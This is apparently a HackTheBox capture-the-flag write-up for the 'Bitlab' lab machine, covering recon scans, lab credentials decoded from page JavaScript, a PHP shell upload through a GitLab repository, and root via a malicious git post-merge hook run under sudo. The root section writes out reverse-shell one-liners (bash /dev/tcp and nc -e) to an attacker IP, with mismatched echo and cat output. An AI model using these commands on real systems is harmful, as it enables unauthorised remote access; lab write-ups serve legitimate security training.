---
layout: single
title: Bitlab Writeup
tags: hackthebox
date: 2019-12-14
classes: wide
excerpt: Bitlab machine was a great machine, The machine is centered around a github instance where you have to gain access through finding the credentials for our foothold. 
header:
    icon: /assets/images/hackthebox.webp

---
Bitlab machine was a great machine, The machine is centered around a github instance where you have to gain access through finding the credentials for our foothold.
## Recon
In our nmap scan it  shows two ports which is `80 and 22`
### nmap scan
```
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.38s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Website - 80 TCP
By checking the port 80 first we can see that it has a github instance.

### directory scan:
 We can see that by running ```gobuster```  it shows us multiple directories that is in the site.
```
"public"                                                                             
"robots.txt"                                                                         
"root"                                                                               
"search"  Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
/groups/new
groups/*/edit
/users
/help
```
## User:
 To gain the initial foothold the first thing we should do is explore the site as it may have a directory that haven't got founded by gobuster.
By going to the ```bookmarks.html``` we can see a javascript code.
The javascript code is the following:

![f51d218b.png](/assets/images/bitlab/f51d218b.png)

and decoding it shows the username and password:
```
user:clave, password: 11des0081x
```
after logging in with the username and password, in this site we have to figure out on how we can upload a shell 

### Shell upload:
1. Listen to a connection in your machine through nc
2. Go to the profile repository
3. Edit the index.php with a php shell
4. Go to bitlab.htb/profile

![Screenshot_2019-10-02 Projects · Dashboard.png](/assets/images/bitlab/07dc18ba.png)

## Root:
By typing `sudo -l` we can see that we can run git pull as root, If you don't have any idea how  git pull works checkout this [link](https://git-scm.com/docs/git-pull) 

![Screenshot_2019-10-02_09-20-50.png](/assets/images/bitlab/4ef88a6c.png)

Copy a repository from the website through the `/tmp directory`
```
www-data@bitlab:/tmp$ cp /var/www/html/profile .
```
To root this machine we have to use github hooks to execute our custom when events occurs. For more details click [here](https://githooks.com/)

Using `post-merge` to get shell:
```
www-data@bitlab:/tmp/profile/.git/hooks$ echo '#!/bin/bash' > post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ 
cat post-merge
#!/bin/bash
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'bash -i >& /dev/tcp/10.10.14.17/1234 0>&1' >> post-merge

cat post-merge
#!/bin/bash
nc -e /bin/sh 10.10.14.17 1234
www-data@bitlab:/tmp/profile/.git/hooks$ chmod +x post-merge
  
```
1. Edit something in the repository through the website
2. Submit a merge request
3. do a `sudo git pull` in the local repository


![Screenshot_2019-10-03 Update README md ( 9) · Merge Requests · Administrator Profile.png](/assets/images/bitlab/1be6bbff.png)

## Rooted

Flag:
```
root@bitlab:~# cat root.txt
cat root.txt
redacted
root@bitlab:~# 


```

